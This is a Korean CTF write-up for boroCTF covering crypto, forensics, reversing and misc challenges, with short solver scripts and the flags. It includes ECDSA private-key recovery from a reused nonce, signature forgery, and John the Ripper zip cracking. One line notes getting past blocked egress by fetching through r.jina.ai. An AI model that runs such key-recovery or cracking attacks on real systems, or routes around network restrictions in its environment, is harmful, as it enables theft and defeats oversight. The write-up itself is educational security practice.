> **문제 설명(원문) (출제 Franklin)**: We, the Boro Cyber Division have been spying on the chats of a group of local hackers. We used to be able to decrypt their chats from base64 but they seemed to have changed their encoding. Can you find out what they’re talking about now?

**개요·정찰**

**관찰** — 암호문 문자셋이 `[ ] { } | < > ( ) , ; :` 등 거의 모든 ASCII 기호(91자) → base64(64)도 ascii85도 아닌 **basE91**.

**분석·공격**

```text
# crypto/dec_basic.py — basE91 디코더
B91 = "A-Za-z0-9!#$%&()*+,./:;<=>?@[]^_`{|}~\""   # 91자 알파벳
def b91decode(s):   # 13/14비트 가변길이 누산
    ... n += 13 if (v & 8191) > 88 else 14 ...
print(b91decode(ct))
→ b'...User1: Nope. boroCTF{B@5ics_0f_B@si6s}'
```

> 💡 **원리.** 더 조밀한 인코딩으로 "강화"한 척했지만 가역 — 문자셋 분석만으로 종류 특정.

**FLAG:** `boroCTF{B@5ics_0f_B@si6s}`

### Et Tu, Brute — Crypto · Caesar

*취약점: **고전 치환(crib)***

> **문제 설명(원문) (출제 ForeverFlames)**: Stabbed by his own men. Each stab wound marked how betrayed he was. Can you reverse the damage?

erurFWI{@iu13qgq0pru3}

**개요·공격**

카이사르 → Caesar 암호. **관찰** — 암호문 앞 `erurFWI{`를 알려진 평문 `boroCTF{`와 대응시키면 전부 **−3 시프트**(숫자/기호는 보존).

```text
# python
>>> shift("erurFWI{@iu13qgq0pru3}", -3)
boroCTF{@fr13ndn0mor3}   # "a friend no more"
```

> 💡 **방어.** 단일키 치환은 crib 한 조각이면 키가 즉시 드러난다 — 보안 용도 금지.

**FLAG:** `boroCTF{@fr13ndn0mor3}`

### Not the Flag — Crypto · XOR

*취약점: **단일바이트 XOR (0xFF)***

> **문제 설명(원문) (출제 ForeverFlames)**: 9d 90 8d 90 bc ab b9 84 8b 97 ce db a0 96 8c a0 91 cf 8b a0 91 90 8b a0 8b 97 cc a0 99 93 bf 98 82

**개요·공격**

**관찰** — hex 바이트가 전부 `0x80+` → 단일바이트 변환 의심. 첫 바이트로 키 역산: `0x9d ^ 'b' = 0xFF` → **XOR 0xFF = bitwise NOT**. 검증 `0x90^0xFF=0x6f('o')` → "boro".

**FLAG:** `boroCTF{th1$_is_n0t_not_th3_fl@g}`

### Disco — Crypto · 픽셀 인코딩

*취약점: **RGB(=hex)에 데이터 인코딩***

> **문제 설명(원문) (출제 Franklin)**: The hexagonal colors are simply beautiful.

**개요·공격**

힌트 "hexagonal colors"=hex 색상값 말장난. 디스코 이미지의 고유색을 등장 순서로 추출, 각 색의 (R,G,B) 바이트를 ASCII로 읽으면 `62 6f 72="bor"` → 플래그.

**FLAG:** `boroCTF{nEv3r_l0$e_YoU4_Be@t}`

### Babel's Vault — Crypto · 커스텀 로직

*취약점: **상수 관계(off-by-one) 역설계** · PoC: **crypto/babel.py***

> **문제 설명(원문) (출제 nulled)**: My friend sent me a random codebase with a Library of Babel implementation. Apparently the author is well known to hide secrets in his code, but I don't see any here.

**개요·정찰**

구현 + `AUTHORSNOTE.txt`. **관찰** — `page_from_seed`는 `seed+C_page`를 55진수로, `image_from_seed`는 `seed−C_image`를 256진수로. 두 상수가 정확히 **1 차이**(저자가 숨긴 페어링) + note가 정확히 940자(=한 페이지).

**분석·공격**

**① `AUTHORSNOTE.txt`(940자)를 역인코딩해 seed 복원** — note를 55진수로 해석한 값에서 `C_page`를 빼면 `page_from_seed(seed)==note`를 만족하는 seed가 나온다.

```text
# 증적 ① — crypto/babel.py
note_val = sum(idx[c]*55**i for i,c in enumerate(note))   # 940자
seed = note_val - C_page                  # page_from_seed(seed)==note ✓
```

**② off-by-one 페어링으로 이미지 → 좌표 인덱스 → 문자 재조립** — 같은 seed의 이미지에서 비-제로 픽셀 (r,g,b)를 note 문자열의 인덱스로 써서 플래그를 조립한다.

```text
# 증적 ②
nz = [p for p in image_from_seed(seed) if p!=(0,0,0)]   # C_image = C_page-1 페어링
''.join(note[r*100+g*10+b] for (r,g,b) in nz)
→ boroCTFoneSeedCipherInInfinity
```

**FLAG:** `boroCTF{oneSeedCipherInInfinity}`

### Flight — Crypto · Wingdings

*취약점: **폰트 글리프 매핑** · 테마: **Undertale W.D. Gaster***

> **문제 설명(원문) (출제 Franklin)**: dark, darker, yet darker.

♌︎□︎❒︎□︎👍︎❄︎☞︎❀︎⬥︎✋︎■︎♑︎📂︎■︎🕯︎♉︎✏︎⧫︎❝︎

**개요·공격**

Gaster(Undertale) 테마 + 심볼 형태 → **Wingdings** 식별. 19글리프 중 홀수 위치는 `U+FE0E`(VS)라 무시, 공식 입력표(alanwood.net)로 매핑. 표에 없는 4글리프는 `{ i i }` 장식.

**오답 교정** — 이전 `{wIng1n'_!t}`은 대문자 I(→i)·`!`(→i) 오독. "Flight"="winging it".

**FLAG:** `boroCTF{wing1n'_it}`

### Flipper's Dilemma — Crypto · Wave3

*취약점: **단일바이트 XOR (0x15)***

> **문제 설명(원문) (출제 Franklin)**: Why do we flip a coin when we have to make a hard choice? Maybe the flipping here isn't so random. I flipped it once yet still 0x15 times.

wzgzVASnS4|eE${J%`>h

**개요·공격**

비트 뒤집기. 각 바이트 `^ 0x15` → 평문. 키는 첫 바이트 `^ 'b'`=0x15로 역산.

**FLAG:** `boroCTF{F!ipP1n_0u+}`

### So Many Layers — Crypto · Wave3

*취약점: **3중 인코딩***

> **문제 설명(원문)**: Makes me cry.

**개요·공격**

. 바깥부터 **base64 → hex → binary(0/1)** 순으로 디코드. 각 층은 문자셋이 지문이다.

**FLAG:** `boroCTF{L!k3_aN_0n1on^}`

### Boro Coin 1 — Crypto · Franklin · ECDSA

*취약점: **ECDSA nonce 재사용 → 개인키 복구** · 자료: **transactions.json** · PoC: **wave3/c31/solve.py***

> **문제 설명(원문) (출제 Franklin)**: We have a government seized Boro Wallet with 51.42 bc before any transactions occurred. Sadly, the suspect refuses to give us the private key. Can you retrieve the key?

Boro Coin uses standard secp256k1 ECDSA. A transaction hash is generated by taking the SHA-256 of the string format: "sender:recipient:amount" (Colons included!) The JSON will give you all the transactions ever made with the wallet.

Note: This challenge does not contain a flag. You will need to submit the private key (lowercase hex, no prefix) as the flag. Example: boroCTF{7f2a4b...}

**개요·정찰**

트랜잭션 로그(`transactions.json`) 각 항목에 `sender/recipient/amount` + DER 서명. `z = SHA256("sender:recipient:amount")`. **관찰** — 모든 서명의 DER을 파싱해 `r`로 그룹핑하면 **동일 `r`을 쓴 두 트랜잭션** 존재 = 같은 nonce `k` 재사용의 결정적 증거.

**분석·공격 — 개인키 복구**

```text
# wave3/c31/solve.py
n = 0xFFFF...364141      # secp256k1 order
for tx in data: r,s = parse_der(tx['signature_der']); z = sha256(msg).digest()
byr[r].append((r,s,z))   # r로 그룹핑 → len(grp)>1 인 r 발견 (nonce 재사용)
k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n        # nonce 복구
d = ((s1*k - z1) * pow(r, -1, n)) % n            # 개인키 복구
print('%064x' % d)
→ boroCTF{1b7ba9dafeb7c7a30fd8043a656c3ab89509db070dbd48b593d8e266b56ca22d}
```

> 💡 **원리.** ECDSA nonce `k`는 매 서명 비밀·유일해야 한다(PS3·여러 지갑이 재사용으로 개인키 유출). 방어: RFC 6979 결정적 nonce.

**FLAG:** `boroCTF{1b7ba9dafeb7c7a30fd8043a656c3ab89509db070dbd48b593d8e266b56ca22d}`

### Boro Coin 2 — Crypto · ECDSA 서명 위조

*취약점: **복구한 키로 서명 위조** · 비고: **Boro Coin 1 후속***

**개요·공격**

Boro Coin 1에서 복구한 개인키 `d`(와 동일 곡선)로 지정 메시지에 대한 **유효 ECDSA 서명을 직접 생성**해 DER 인코딩하면, 그 위조 서명 바이트(`304402…c3342`) 자체가 플래그가 된다.

> 💡 **원리.** 개인키가 유출되면 임의 메시지에 대한 정당한 서명을 위조할 수 있다(서명의 부인방지성 붕괴).

**FLAG:** `boroCTF{304402202cbda85fc21f5e62f94d8378d2dad1a05bc5d5522d5a717f2bdf1df13d558ec70220033a47e398c6d81b053a235884c13b41f5618a6fa85715198a09beefdd5c3342}`

### Qwerty! — Crypto · Wave3

*취약점: **ROT47 + 자판 시프트***

> **문제 설명(원문) (출제 ForeverFlames)**: I am so very sorry.... I made a lot of typos :(

I should rot in hell 😭

?AEAGJ8NJF,\0[d5JcE-

**개요·공격**

(ROT) + 오타 테마. ① ROT47 복호 → ② QWERTY 자판에서 한 칸 좌측 시프트(오타 시뮬레이션) → 평문.

**FLAG:** `boroCTF{typ0_m4st3r}`

### Johnny Boy — Crypto · Wave4

*취약점: **4중 AES zip 크랙** · 도구: **John the Ripper / pyzipper***

> **문제 설명(원문) (출제 Franklin)**: One of our sysadmins recently quit after we had our third data breach this year. We need to access the logs of the time before he left but they are all in encrypted zips. We remember he used pretty similar passwords each time.

**분석·공격**

**① 도구 식별** — "Johnny" + 파일/주석 철자 "USE JOHN THE RIPPER" → John the Ripper로 zip 해시 크랙.

```text
# 증적 ① — zip2john + john
$ zip2john layer1.zip > h1
$ john --wordlist=rockyou.txt --rules h1     # 첫 층 비번 회수
```

**② 4중 중첩 zip을 바깥부터 순차 크랙** — "비슷한 비번" 힌트대로 chip 계열 변형이 각 층에 사용됨.

```text
# 증적 ② — pyzipper 자동화
# 비번 계열: chips → fishandchips → sunchips → chip!  (각 층)
$ python -c "import pyzipper; ..."   # 4층 자동 추출 → flag.txt
→ boroCTF{L@_R11pP3r;}
```

> 💡 **방어.** 사전 단어 기반 비번 금지.

**FLAG:** `boroCTF{L@_R11pP3r;}`

### Efficient Encryption — Crypto · 라틴 방진

*취약점: **Latin square 제약 해 + 단어 탐색** · 자료: **glyphs.png, cells** · PoC: **wave3/c33/decode.py, anagram.py***

> **문제 설명(원문) (출제 Franklin)**: I forgot my flag on the top shelf but i'm too short to reach it :'(. Can you grab it for me?

Note - This challenge does not contain the flag format. Example answer: boroCTF{S0lv3d}

**개요·정찰**

9개 글리프로 채운 9×9 격자가 **라틴 방진**(각 행·열에 9기호 한 번씩 — 스도쿠 사촌). 글리프 집합 `@1RALNQST`는 "TRANQUILS"의 애너그램. 제약을 풀면 복수 해가 나온다.

**분석·공격**

제약 솔버로 후보 해(6개)를 얻고, 각 해의 글리프를 문자로 치환(`@→U,1→I,R,A,L,N,Q,S,T`)한 뒤 행·열·대각선에서 영어 사전 단어를 탐색해 **의미 있는 해**를 식별. 그 해의 **첫 행** 글리프열이 플래그(leet 그대로).

```text
# wave3/c33/decode.py
m={'@':'U','1':'I','R':'R','A':'A','L':'L','N':'N','Q':'Q','S':'S','T':'T'}
words = set(open('words_alpha.txt'))      # 영어 사전
for sol in candidate_solutions:            # 6개 라틴방진 해
    for line in rows+cols+diagonals: findwords(tr(line))   # 길이≥4 단어 탐색
# 식별된 해의 top row 글리프열 = 플래그 (leet)
→ boroCTF{L@T1NSQAR}   # "LATIN SQUAR(E)" leet
```

> 💡 **원리.** 별도 스테가노 없이 **라틴 방진 제약 자체가 답을 인코딩** — 여러 해 중 자연어가 드러나는 해가 정답.

**FLAG:** `boroCTF{L@T1NSQAR}`

## 4. Forensics — 포렌식

"정상 컨테이너의 안 보이는 틈"(EOI 이후·sparse hole·슬랙·픽셀/QR·비정상 프로토콜 필드)에 숨긴 데이터를 무결성 검사·카빙·통계 분석으로 복원한다. 미끼 간파도 핵심. 증적: `writeups/assets/`, PoC: `boroctf/forensics/`·`misc/`.

### File Me to the Moon — Forensics · 100

*기법: **매직바이트 식별***

> **문제 설명(원문) (출제 ForeverFlames)**: Frank sinatra accidentally deleted the file extension on one of his files!!!

What file extension is it supposed to be???

boroCTF{file_extension}

**개요·정찰**

확장자 지워진 `superfile`. ("Fly Me to the Moon"=Sinatra.)

```text
# file / xxd
$ file superfile        →  Microsoft PowerPoint 2007+
$ xxd superfile | head  →  50 4b 03 04 (PK/zip) ... "[Content_Types].xml"
```

PK(zip)+`[Content_Types].xml`+PowerPoint 부속 → OOXML 중 **pptx**.

**FLAG:** `boroCTF{pptx}`

### kitty kitty meow meow — Forensics · 100

*기법: **JPEG EOI append***

> **문제 설명(원문) (출제 Solarity)**: aww... so cute!

**개요·공격**

**관찰** — JPEG는 `FF D9`(EOI)로 끝나야 하나 그 뒤 28바이트가 더 있다.

```text
# python
data = open('meow.jpg','rb').read()
print(data[data.rfind(b'\xff\xd9')+2:])   # EOI 이후 트레일링
→ boroCTF{f0r3nsic_@nalysis#}
```

> 💡 **방어.** 업로드/반출 이미지의 EOI 이후 트레일링 검사.

**FLAG:** `boroCTF{f0r3nsic_@nalysis#}`

### Eschew — Forensics · 100

*기법: **열별 수직 시어 복원***

> **문제 설명(원문) (출제 Franklin)**: My image is flipped and flopped :(.

**개요·분석**

는 **미끼**(단순 flip은 사선 얼룩만). 진짜 왜곡은 **열(column)별 수직 시어**: 각 열이 위치에 비례해 수직 롤됨. 무게중심 피팅으로 기울기 ≈2.01 px/col을 구해 역으로 롤 → 텍스트 정렬, 잔여 이탤릭 deskew 후 판독.

**FLAG:** `boroCTF{SAT_1s_H@rd}`

### File-et Mignon — Forensics · 200

*기법: **GNU sparse tar 카빙***

> **문제 설명(원문) (출제 ForeverFlames)**: Don't try to bite off more than you can chew.

**개요·분석**

40960B GNU sparse tar. 내부 파일은 14GB를 주장하나 대부분 hole이라 그냥 풀면 ~900GB로 팽창(추출 금지). 스트림 해제하며 **비-제로 바이트만** 이어붙이면 sparse 블록에 흩어진 플래그 재조립.

**FLAG:** `boroCTF{y0u_c4rv3d_th3_v01d_l1k3_4_ch3f}`

### Lazing Around — Forensics · 200

*기법: **ext4 슬랙 공간***

> **문제 설명(원문) (출제 Franklin)**: Get back to work!

**개요·분석**

ext4 이미지의 500개 로그. 각 파일은 4KB 블록 1개를 점유하나 실제 크기는 수십 바이트 → 남은 **슬랙 공간**에 2바이트씩 플래그 조각. 18개 파일 슬랙을 N 순서로 연결("Could you cut me some slack?").

> 💡 **원리.** 슬랙(파일 끝~블록 끝)은 일반 읽기로 안 보이는 잔존 영역 → 포렌식 추출 필요.

**FLAG:** `boroCTF{C0u!D_yo8_cuT_m3_Som4_sL@ck}`

### Meeting Location — Forensics · 200

*기법: **pcap ICMP 은닉 채널** · PoC: **misc/parse_markers.py***

> **문제 설명(원문) (출제 snzodiac)**: I've got the network traffic from a well-known athlete. We don't know who the athlete is yet, but we'll address that after we confirm where they are meeting the other party. You know he will pay big bucks if we can get pictures of this athlete and why they are there for him. They're definitely talking in code about a secret meeting place in these packets. Take a look when you have a second. If you can figure out where they are heading, there's 200 boroPoints in it for you. This could be the end of all our suffering if we figure this out.

**분석·공격**

**① 디코이 분리** — 1504패킷 중 대량 디코이(HTTP/DNS/ICMP)는 모든 필드가 균일 분포(χ² 검정)로 노이즈 확정.

```text
# 증적 ① — 통계 분석
# cookie·path·MAC·txid χ² → 균일분포 = 채널 아님
```

**② 비정상 필드 마커로 진짜 채널 식별 + 추출** — 300개 ICMP 중 끝 24개만 `id=0`. seq 순 단일바이트를 이으면 base64.

```text
# 증적 ② — misc/parse_markers.py
icmp0 = [p for p in pkts if p.haslayer(ICMP) and p[ICMP].id==0]
data = bytes(p[Raw].load[0] for p in sorted(icmp0, key=lambda p:p[ICMP].seq))
print(base64.b64decode(data))   # WWFzX01hcmluYV9DaXJjdWl0
→ Yas_Marina_Circuit (F1 야스 마리나 서킷)
```

**FLAG:** `boroCTF{Yas_Marina_Circuit}`

### Judgment of Solomon — Forensics · 300

*기법: **hex 픽셀 → QR 재구성 (이중 트랩)** · 증적: **assets/27_qr_final.png***

> **문제 설명(원문)**: The birth of reconstruction.

**개요·정찰**

**트랩①** — 파일은 ASCII hex 픽셀인데 중간에 박힌 평문 `boroCTF{...}`(39자, `"`·`+` 비정상문자)는 **가짜 플래그**.

**분석·공격**

**트랩②** — 미끼 39자 제거 시 6의 배수로 정렬돼 `unhexlify` 성공 → `\x0a`가 199바이트 간격 → 66×66 → 2×2 블록 반복이라 실제 **33×33 QR**. 검정 모듈만 data로 채택(빨강=미끼), QR-v4 function pattern 덮어쓰니 zxing-cpp가 EC level H로 검증하며 디코드(EC 통과=바이트 확정).

![재구성 QR](assets/27_qr_final.png)  
*증적: 검정 모듈만 채택해 재구성한 33×33 QR (forensics/qr_final.png)*

**FLAG:** `boroCTF{I_f1%ed_wHat_w4$_br0Ken}`

### Mark Zuckerburg — Forensics · Wave4

*기법: **PNG XMP tiff:Model***

**개요·공격**

제목 "Meta" 말장난=메타데이터. 픽셀이 아니라 XMP 블록의 `tiff:Model` 필드에 플래그.

```text
# exiftool
$ exiftool -XMP:all chal.png | grep -i model
Camera Model Name : boroCTF{M3+a_d@ta_1s_M7_Fa40rite}
```

**FLAG:** `boroCTF{M3+a_d@ta_1s_M7_Fa40rite}`

### Chronos — Forensics · Wave4

*기법: **타이밍 covert channel***

**개요·분석**

"Chronos=시간". 페이로드가 아니라 **패킷 도착 간격**에 데이터: `~250µs=0`, `~750µs=1` → 8비트씩 ASCII 복원.

```text
# python (scapy)
dt = [b.time - a.time for a,b in zip(pkts, pkts[1:])]
bits = ''.join('1' if d>5e-4 else '0' for d in dt)
print(bytes(int(bits[i:i+8],2) for i in range(0,len(bits),8)))
→ boroCTF{c0mbobulat3_sp@gh3tti_nep0t1$m}
```

> 💡 **방어.** 트래픽 정형화(constant-rate)·지터 추가로 타이밍 누설 차단.

**FLAG:** `boroCTF{c0mbobulat3_sp@gh3tti_nep0t1$m}`

### Retinal Burn — Forensics · 200 (초기 오답→해결)

*기법: **색 채널 분해 + 글자 보정** · 증적: **assets/26_burn.png***

> **문제 설명(원문) (출제 Franklin)**: My friend Jonas Wagner sent me a challenge but I can't be bothered to do it. He was always one to be working on his own sorts of projects and stuff. You do it.

**개요·정찰**

섬광탄(M84) 사진. "친구 Jonas Wagner"=Forensically(29a.ch) 제작자 → 그 도구로 분석하라는 유도. 색 채널 분해로 미끼 4종 발견: `FAKE_FLAG`(회색)·`fakeCTF{I_HATE_RED}`(시안)·`TOO BRIGHT!!!`(검정)·`BoroCTF{OW_^MY_E7ES!}`(노랑).

![burn.png 원본](assets/26_burn.png)  
*증적: burn.png 원본(800×800). 미끼 4종이 색 채널별 은닉(육안 거의 불가).*

**분석·공격**

노랑 미끼 제출 → **오답**. Forensically 전 기능+LSB/PNG청크/무결성 등 ~25기법을 정적 복제해 **픽셀엔 미끼뿐, 5번째 플래그 없음** 확정. 정답은 보이는 미끼의 글자 보정: 스텐실 폰트 O↔0 + 대문자 B 함정 → 소문자 b + 숫자 0.

> ⚠️ **교훈.** 픽셀이 깨끗하면 과도분석 말고 **보이는 flag 텍스트의 글자 보정(O↔0·대소문자·leet)**을 먼저(무제한 시도 한정).

**FLAG:** `boroCTF{0W_^MY_E7ES!}`

## 5. Reversing — 리버싱

정석: **비밀은 결국 산출물(바이너리/파일) 안에 있다**. 정적·동적 분석으로 검증 루틴을 역산한다. PoC: `boroctf/rev/`, `wave3/r120/`.

### Hidden but definitely not — Rev · 100

*대상: **ELF64 PIE stripped** · 기법: **정적 디스어셈블 + XOR 7***

> **문제 설명(원문) (출제 Franklin)**: The most trite challenge concept.

**개요·정찰**

objdump 없이 capstone+pyelftools로 정적 분석. `_start`가 `__libc_start_main`에 넘기는 포인터로 main(0x1229) 위치 특정.

**분석·공격**

**관찰** — main이 스택에 즉시값으로 패스워드(`"Rate5Stars"+"BecauseGreatChallenge"`)를 조립해 `strcmp`. 매치 시 34바이트 배열을 **XOR 7**해 출력 → 실행 없이 정적 복원.

**FLAG:** `boroCTF{I_H8_M@7ing_StR1ng5_cHals}`

### George Orwell — Rev · 100

*대상: **PE32 (AutoHotkey 컴파일)***

> **문제 설명(원문) (출제 Franklin)**: Big Brother says: We're always watching. Your words, no matter how silent, will be heard.

Note - This challenge simulates real malware but contains NO malicious payloads.

**개요·공격**

AHK는 스크립트를 RT_RCDATA 리소스로 임베드 → `pefile`로 원본 AHK 추출. hotstring `:*:iloveboroctf::` 트리거 시 `Chr()` 코드로 플래그 조립 → 디코드.

```text
# pefile
import pefile; pe=pefile.PE("big_brother")
# RT_RCDATA /10/1/1033 추출 → 원본 AHK 소스 → Chr() 시퀀스 디코드
→ boroCTF{AHK_1s_lIs+eni4g}
```

**FLAG:** `boroCTF{AHK_1s_lIs+eni4g}`

### Amazing — Rev · 200

*대상: **challenge.py (maze)** · 기법: **LCG/marshal 브루트***

> **문제 설명(원문) (출제 Franklin)**: Escape is impossible unless you take the right step.

**개요·정찰**

**관찰** — `hope()`가 임베드 blob을 LCG 키스트림으로 XOR 복호 후 `marshal.loads`+실행. seed `mod=(r^0x2c)*r`가 미로 좌표(r,c)에 종속.

**분석·공격**

**① 도달 가능한 모든 좌표를 브루트하며 복호 시도**

```text
# 증적 ① — 브루트
for (r,c) in reachable_cells:           # 도달 가능한 모든 좌표
    mod=(r^0x2c)*r; try: code=marshal.loads(xor_lcg(blob,mod))
```

**② 유효 code object가 나오는 유일 좌표 (91,68) → flag 추출** — mod=19201에서만 올바른 Python code object 헤더("올바른 한 걸음").

```text
# 증적 ② — co_consts
# 오직 (91,68)→mod=19201 에서만 유효 code object 헤더
co_consts: Ym9yb0NURntlczRAcGVfd0E1XzFuZXYhdGFibGV9
base64 디코드 → boroCTF{es4@pe_wA5_1nev!table}
```

**FLAG:** `boroCTF{es4@pe_wA5_1nev!table}`

### Perfectly Destructive File — Rev · 200

*대상: **악성 PDF***

> **문제 설명(원문) (출제 Franklin)**: Subject: Urgent - John's computer is acting up again

To whom it may concern,

John said that he downloaded a financial report for this quarter, yet now his computer has a "virus". He says that all of his files suddenly have a weird double extension. Like they all have ".boroCTF" appended onto them.

Can you help figure out what happened? Probably pirating video games again if you ask me.

Thanks, Jill

Note - This challenge does NOT contain any functional malware.

**개요·공격**

압축 객체스트림(ObjStm)을 zlib 해제 → **OpenAction JavaScript**(자동 실행)에 base64 플래그. "free flag" 버튼은 미끼.

```text
# pdf 분석
# ObjStm zlib 해제 → OpenAction JS:
var encoded = "Ym9yb0NURnswbjFfRiFsZV9JNV9AMTFfaXRfdEFrZSR9";
base64 → boroCTF{0n1_F!le_I5_@11_it_tAke$}
```

**FLAG:** `boroCTF{0n1_F!le_I5_@11_it_tAke$}`

### AlphaCode — Rev · 300

*대상: **esolang + 원격 채점** · PoC: **rev/alphacode/solution.ac***

> **문제 설명(원문) (출제 nulled)**: Can you decrypt the language and beat the gauntlet?

**분석·공격**

**① 언어 의미론 복원(예제 + 라이브 프로빙)** — 문자 리터럴=4글자 단어(`sum(idx)+32=ASCII`), 어큐뮬레이터/라인버퍼 VM(`di/fr/dp/fo`), **입력은 역순**.

```text
# 증적 ① — helloworld.ac 분석
# 'zpaa zzta ...' 4자 토큰 → chr(sum(letter_index)+32)
# di X=acc로드, fr=라인 commit, dp=input[p] (역순), fo=출력+개행
```

**② 요구 출력 프로그램 작성 → gauntlet 통과**

```text
# 증적 ② — rev/alphacode/solution.ac (발췌)
zm a
zpaa zzta zzzb zzzb zzze aaaa ...   # 4자 토큰 = 문자열 변수
zz fi  /  zz di a  /  zz fr  /  zz dp   # 입력 흡수→commit→역순 입력
요구 2줄 출력 → gauntlet 3테스트 통과 → 서버가 flag 직접 출력
```

**FLAG:** `boroCTF{r3verse_by_guessncheck}`

### Not Your Time — Rev · Wave3

*기법: **~NOT 역산***

> **문제 설명(원문) (출제 Franklin)**: One of the trifecta of bitwise operations.

**개요·공격**

검증이 `input[i]==~table[i]`. 하드코딩 table을 추출해 비트 반전(`~`)하면 정답 입력=플래그 복원. 실행 없이 정적.

**FLAG:** `boroCTF{N0t_nO+_tH3_FL@g}`

### Franklin — Rev · Wave3

*기법: **TrueType GSUB ligature 은닉***

> **문제 설명(원문)**: A customized idea by me, about me, with me, for you.

**개요·공격**

플래그가 폰트 `GSUB`(글리프 치환) 테이블의 ligature 규칙에 은닉. `fontTools`로 GSUB liga 룰을 덤프하면 숨은 문자열이 드러난다.

> 💡 **원리.** 폰트도 실행 가능한 데이터 구조 — 비밀 은닉처가 된다.

**FLAG:** `boroCTF{fR4nkl1n_f0n7}`

### Cat in the … Box? — Rev · Wave3

*기법: **XOR → catbox URL fetch***

> **문제 설명(원문) (출제 Franklin)**: We love cats over here at boroCTF. We feel like we have a hidden connection to them.

**개요·공격**

슈뢰딩거 테마. 임베드 바이트를 XOR 복호 → `catbox.moe` URL → 파일 fetch(egress 차단 시 `r.jina.ai` 우회) → 플래그.

**FLAG:** `boroCTF{lEts_gO_B3y0nd_b1nar1e$}`

### Bike Rack — Rev · Wave4

*기법: **PIN 미끼 + .data charset 인덱싱***

> **문제 설명(원문) (출제 Franklin)**: OH NO!!! You forgot the PIN for your bike lock. Analyze the lock and figure out how to break it.

**개요·공격**

PIN 검사는 미끼(입력 무관). 실제 플래그는 `.data` 하드코딩 바이트를 변환 후 charset 인덱스로 매핑해 생성. 검증 분기 대신 **플래그 생성 루틴**을 정적 재현해 추출.

> 💡 **교훈.** "정답 비교"가 아니라 "플래그가 어떻게 만들어지나"를 봐야 한다.

**FLAG:** `boroCTF{R@nd00M_YZ42u%ym}`

### OmegaCode — Rev · 300

*대상: **자작 esolang VM + nc 채점** · PoC: **wave3/r120/gen_eof.py***

> **문제 설명(원문) (출제 nulled)**: AlphaCode is back.... but now its crazier.

**개요·정찰**

과제: OmegaCode로 입력을 EOF까지 줄 단위로 받아 `x | {input x}` 번호 형식으로 출력. VM 완전 역공학(opcode `di/fr/fo/fi/do/ma/mm/eq`, base26 digitsum, do=점프).

**분석·공격 — 블로커 3개 실측 해결**

**①** `fi` EOF: 빈 줄은 계속, 진짜 EOF는 즉시 종료 → 가변 reader 자연 종료. **②** "문자열 구분 불가"는 오류 — `di L; di P; eq`로 문자열 비교 가능 → 분기 구현. **③** halt: `ex`는 invalid → ENDEX를 프로그램 끝 너머로 점프(PC overrun 종료).

```text
# wave3/r120/gen_eof.py (생성기 DSL)
a.label("LOOP")
a.op("zz fi","zz do","l")                              # 한 줄 읽기
a.op("zz di","l","zz di","p","zz eq","zz do","d")      # d=(l=="EOF") 문자열 비교!
a.op("zz di","t","zz di","d","zz mm","zz do","v")      # 분기 산술합성
... "c | line" 출력 → a.op("zz di","j","zz do","X")   # LOOP
a.label("ENDEX")                                       # PC overrun 종료
입력 1·3·9개 로컬 검증 후 제출 → 통과
```

**FLAG:** `boroCTF{greek_alphabet_is_over_i_promise_on_franklin}`

## 6. Misc — 기타

혼합 분야. 인코딩 다층화·polyglot·생성AI 워터마크·다층 스테가노 등. PoC: `boroctf/misc/`.

### AI Slop — Misc · 100 (시도 5회)

*기법: **생성 AI 워터마크 식별***

> **문제 설명(원문) (출제 ForeverFlames)**: What is this AI slop??? Which AI made this!!!

format: boroCTF{ai_in_lowercase}

WARNING ONLY 5 ATTEMPTS.

**개요·공격**

`slop.jpg` EXIF 無. **관찰** — 우하단 모서리의 작은 **네 꼭짓점 스파클(✦)** = Google Gemini 생성 워터마크. 코너 확대(`misc/corner_br.png`)로 육안 검증 후 1회 제출.

**FLAG:** `boroCTF{gemini}`

### 64 is life — Misc · 200

*기법: **파일명 base64 인덱스 + 첫바이트 재조립***

> **문제 설명(원문) (출제 ForeverFlames)**: Truth, broken into sixty-four.

**분석·공격**

**① 파일명 base64로 64개 청크 순서 복원** — `ctf_chunks/`의 파일명이 인덱스의 base64(`Mg==`→"2").

```text
# 증적 ①
order = sorted(files, key=lambda f: int(b64decode(f.name)))   # 1..64 정렬
```

**② 각 파일 첫 바이트만 모아 다시 base64 디코드** — 나머지 바이트는 "64" 필러.

```text
# 증적 ②
blob = bytes(open(f).read(1) for f in order)   # 첫 바이트만
print(b64decode(blob))
→ boroCTF{s1xty_f0ur_b3auty}
```

**FLAG:** `boroCTF{s1xty_f0ur_b3auty}`

### File File Crocodile — Misc · 200

*기법: **PNG+ZIP polyglot, 시그니처 복원***

> **문제 설명(원문) (출제 ForeverFlames)**: We managed to snap a picture of the infamous File File Crocodile, but right before the flash went off, he swallowed a locked archive containing our flag! He's a master of disguise and his stomach acid has slightly digested the file signatures. Interrogating him didn't work as the only word he seemed to know was "croc".

Can you cut him open, perform some surgery, and get our archive back?

**분석·공격**

**① 손상된 ZIP 시그니처 3곳 복원** — PNG IEND 뒤 ZIP append인데 `PK` 시그니처가 전부 `FC`로 덮임("악어가 먹음").

```text
# 증적 ① — 시그니처 복원
data = data.replace(b'FC\x03\x04', b'PK\x03\x04')   # local header
            .replace(b'FC\x01\x02', b'PK\x01\x02')   # central dir
            .replace(b'FC\x05\x06', b'PK\x05\x06')   # EOCD
```

**② 비번 `croc`(악어가 아는 유일한 단어)로 해제 → flag**

```text
# 증적 ②
zipfile.ZipFile('fixed.zip').extractall(pwd=b'croc')
→ boroCTF{n3v3r_sm1l3_4t_4_p0lygl0t_cr0c0d1l3}
```

**FLAG:** `boroCTF{n3v3r_sm1l3_4t_4_p0lygl0t_cr0c0d1l3}`

### Distortion — Misc · 100

*기법: **적대적 재프레임 (스폰서 로고)***

> **문제 설명(원문) (출제 ForeverFlames)**: I swear I've seen this logo before... or at least a rendition of it. That's it! The owner gave me money!

**개요·분석**

빨간 K+검은 이중 셰브런+파란 별. 1차 "Converse" 가정 13개 브랜드 오답. **재프레임** — 역이미지 2엔진 모두 특정 실패 시 "유명 브랜드" 전제 의심. "the owner gave me money"=스폰서 → 홈페이지 "SPONSORED BY" = **Kite Army**. 색만 swap된("Distortion") 로고로 검증.

> ⚠️ **함정.** Distortion 정답=스폰서 Kite Army / The Squad 정답=주최팀 KyteBytes. 스폰서≠주최팀(양방향 함정).

**FLAG:** `boroCTF{kite_army}`

### Worthful Glory — Misc · 200 (소문자 예외)

*기법: **다층(헤더복구→steghide→암호 zip)** · PoC: **misc/steghide_extract.py***

